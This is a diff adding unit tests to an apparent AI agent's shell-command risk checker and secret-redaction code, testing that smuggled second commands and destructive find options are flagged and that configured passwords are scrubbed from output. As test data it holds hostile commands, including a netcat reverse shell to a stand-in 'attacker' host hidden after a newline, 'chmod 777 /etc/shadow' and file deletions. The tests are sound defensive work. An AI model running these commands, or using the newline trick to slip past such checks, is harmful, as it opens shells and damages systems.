@@ -244,6 +244,60 @@ describe("commands that name a credentials file", () => {
   });
 });
 
+describe("shell risk — second-command bypasses", () => {
+  it("a newline is a command separator, not whitespace inside a safe command", () => {
+    // bash -lc runs the second line; the first token being `ls` does not make it safe.
+    expect(assessCommandRisk("ls\nnc attacker 4444 -e /bin/sh").level).toBe("confirm");
+    expect(assessCommandRisk("echo hi\nchmod 777 /etc/shadow").level).toBe("confirm");
+    expect(assessCommandRisk("cat a.txt\r\nrm -f b.txt").level).toBe("confirm");
+  });
+
+  it("does not treat || as invisible", () => {
+    expect(assessCommandRisk("grep foo f || rm bar").level).toBe("confirm");
+  });
+
+  it("pulls find back to confirm when it can act, but not when it only reads", () => {
+    // find is a language of its own: -delete removes and -exec runs anything.
+    expect(assessCommandRisk("find . -delete").level).toBe("confirm");
+    expect(assessCommandRisk("find . -type f -exec rm {} +").level).toBe("confirm");
+    expect(assessCommandRisk("find / -name '*.conf' -execdir cat {} ;").level).toBe("confirm");
+    expect(assessCommandRisk("find . -name '*.ts'").level).toBe("safe");
+    expect(assessCommandRisk("find src -type f").level).toBe("safe");
+  });
+});
+
+describe("secret redaction covers non-provider secrets", () => {
+  it("collects portal, mail and voice secrets the config routes through env", async () => {
+    const { configuredSecretValues } = await import("../src/config/credentials.js");
+    const env = {
+      PAYER_PORTAL_PW: "hunter2-superlong-portal-password",
+      AETHERACLAW_IMAP_PASSWORD: "imap-password-verylong-1234",
+      TWILIO_AUTH_TOKEN: "twilio-auth-token-abcdef123456",
+    } as unknown as NodeJS.ProcessEnv;
+    const cfg = {
+      browser: { portals: [{ passwordEnv: "PAYER_PORTAL_PW", usernameEnv: "PAYER_PORTAL_USER" }] },
+      voice: { authTokenEnv: "TWILIO_AUTH_TOKEN" },
+    };
+    const secrets = configuredSecretValues(cfg, env);
+    const values = secrets.map((s) => s.value);
+    expect(values).toContain("hunter2-superlong-portal-password");
+    expect(values).toContain("imap-password-verylong-1234");
+    expect(values).toContain("twilio-auth-token-abcdef123456");
+
+    // And the choke-point scrub actually removes them from tool output.
+    const dumped = `PW=hunter2-superlong-portal-password TOKEN=twilio-auth-token-abcdef123456`;
+    const scrubbed = redactSecrets(dumped, secrets);
+    expect(scrubbed).not.toContain("hunter2-superlong-portal-password");
+    expect(scrubbed).not.toContain("twilio-auth-token-abcdef123456");
+  });
+
+  it("ignores env vars that are unset", async () => {
+    const { configuredSecretValues } = await import("../src/config/credentials.js");
+    const cfg = { browser: { portals: [{ passwordEnv: "NOT_SET_ANYWHERE" }] } };
+    expect(configuredSecretValues(cfg, {} as NodeJS.ProcessEnv)).toEqual([]);
+  });
+});
+
 // ── Local servers ────────────────────────────────────────────────────────────
 
 describe("finding a local model server", () => {
